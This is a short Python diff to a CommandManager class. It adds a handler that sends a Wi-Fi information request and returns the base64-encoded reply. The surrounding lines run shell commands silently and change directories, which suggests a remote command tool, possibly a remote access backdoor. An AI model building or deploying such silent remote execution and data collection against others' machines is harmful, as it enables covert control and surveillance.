@@ -78,6 +78,15 @@ class CommandManager(object):
             Popen(execute, shell=True, stdout=DEVNULL, stderr=DEVNULL)
             return
         
+        if command == WIFI_INFO_FULL:
+            self.writer(gen_xml(self.tag, **message).encode())
+            result = str()
+            try:
+                result = base64.b64encode(self.reader()).decode()
+            except Exception as e:
+                print(e)
+            return result
+
         if command.startswith(CHANGE_CWD):
             matchcd = re.match(CHANGE_CWD_PATTERN, command)
             _, path = matchcd.groups()
